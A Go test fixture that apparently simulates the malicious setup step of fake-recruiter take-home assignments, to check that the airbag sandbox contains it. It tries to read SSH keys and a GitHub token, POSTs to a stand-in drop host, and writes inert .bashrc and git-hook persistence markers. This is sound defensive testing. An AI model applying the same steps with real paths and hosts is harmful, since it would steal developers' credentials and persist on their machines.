// Command setup is the one-step setup for this take-home assignment.
//
// SIMULATION. This is a benign reproduction of the setup-step malware
// seen in fake-recruiter take-home campaigns, written for airbag's
// VM-backend integration test. Each step below is what such malware
// does: read the host user's SSH key, read a token from the
// environment, send what it found to a drop host, and install shell and
// git-hook persistence. Here every step runs against canaries the test
// harness created, there is no obfuscation, no real credential path, and
// the only network targets are a .invalid host and the harness's own
// listener. It collects nothing and exfiltrates nothing. Under airbag
// every step is contained; the harness proves that from the outside.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// coordinates are the host-specific canary locations the harness passes
// in through /check.json, the same channel the runtime-options probe
// uses. Real malware would hard-code these; the test needs the host's
// actual path and address so each denial is checked against something
// that really exists outside the sandbox.
type coordinates struct {
	HostSSHKeyPath string // the host user's key, at an absolute path the guest must not reach
	DirectAddress  string // host_ip:port of a listener reachable from the host, as a direct-egress control
}

// observations is what the payload learned from inside the sandbox. Each
// field is true when the boundary held, so the harness asserts them all.
// No field carries a canary value: a leak must not be printed even when
// a check reports that the leak happened.
type observations struct {
	HostSSHKeyHidden         bool `json:"host_ssh_key_hidden"`
	GitHubTokenHidden        bool `json:"github_token_hidden"`
	ExfilViaProxyDenied      bool `json:"exfil_via_proxy_denied"`
	DirectHostDialDenied     bool `json:"direct_host_dial_denied"`
	PersistenceWrittenToCopy bool `json:"persistence_written_to_private_copy"`
}

func main() {
	o, err := probe()
	if err != nil {
		fmt.Fprintln(os.Stderr, "setup:", err)
		os.Exit(1)
	}
	b, err := json.Marshal(o)
	if err != nil {
		fmt.Fprintln(os.Stderr, "setup:", err)
		os.Exit(1)
	}
	// One line the harness parses. It carries only verdicts, no secret.
	fmt.Println("TAKEHOME_CHECK " + string(b))
}

func probe() (observations, error) {
	var o observations
	raw, err := os.ReadFile("/check.json")
	if err != nil {
		return o, err
	}
	var c coordinates
	if err := json.Unmarshal(raw, &c); err != nil {
		return o, err
	}
	o.HostSSHKeyHidden = sshKeyUnreadable(c.HostSSHKeyPath)
	// A token named like a credential is dropped from the guest
	// environment by airbag, so the payload sees nothing to steal.
	o.GitHubTokenHidden = os.Getenv("GITHUB_TOKEN") == ""
	o.ExfilViaProxyDenied = exfilDenied()
	o.DirectHostDialDenied = directDialDenied(c.DirectAddress)
	o.PersistenceWrittenToCopy = writePersistence() == nil
	return o, nil
}

// sshKeyUnreadable tries the host user's key two ways a payload would:
// the guest's own $HOME/.ssh key, and the host's absolute path. The
// isolated profile gives an empty private HOME and never mounts the
// host's, so both reads must fail. A read that succeeds means a leak, so
// the content is discarded and never surfaced.
func sshKeyUnreadable(hostPath string) bool {
	guestPath := filepath.Join(os.Getenv("HOME"), ".ssh", "id_ed25519")
	return unreadable(guestPath) && unreadable(hostPath)
}

func unreadable(p string) bool {
	_, err := os.ReadFile(p)
	return err != nil
}

// exfilDenied POSTs a benign body to a .invalid host through the guest's
// HTTPS proxy. The host is not on the allowlist, so the proxy must refuse
// the CONNECT before any TLS and the request must fail. The body carries
// no data because there is nothing to send.
func exfilDenied() bool {
	proxy, err := url.Parse(os.Getenv("HTTPS_PROXY"))
	if err != nil {
		return false
	}
	transport := &http.Transport{Proxy: http.ProxyURL(proxy)}
	defer transport.CloseIdleConnections()
	client := &http.Client{Transport: transport, Timeout: 15 * time.Second}
	body := strings.NewReader(`{"note":"airbag take-home simulation; collected nothing"}`)
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "https://exfil.invalid/collect", body)
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return true // the proxy refused the CONNECT, as it must
	}
	_ = resp.Body.Close()
	return resp.StatusCode != http.StatusOK
}

// directDialDenied dials, with no proxy, a listener the harness proved
// reachable from the host. The sandbox has no route off the host, so the
// dial must fail; a success would mean the guest reached the host network
// directly.
func directDialDenied(addr string) bool {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if conn != nil {
		_ = conn.Close()
	}
	return err != nil
}

// writePersistence makes the two changes setup-step malware uses to
// survive: a line in the shell startup file and an executable git hook
// that runs on the next checkout. Under airbag both land only in the
// guest's private copy, so the host's files stay untouched and review
// flags the git hook as "persist". The marker text is inert and names
// the simulation.
func writePersistence() error {
	const marker = "# airbag take-home simulation persistence marker (inert)\n"
	f, err := os.OpenFile(filepath.Join(os.Getenv("HOME"), ".bashrc"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	if _, err := f.WriteString("\n" + marker); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Close(); err != nil {
		return err
	}
	// The working directory is the cloned workspace; the hook path is
	// relative to it, so this is a workspace change review will show.
	if err := os.MkdirAll(filepath.Join(".git", "hooks"), 0o755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(".git", "hooks", "post-checkout"), []byte("#!/bin/sh\n"+marker+"exit 0\n"), 0o755)
}
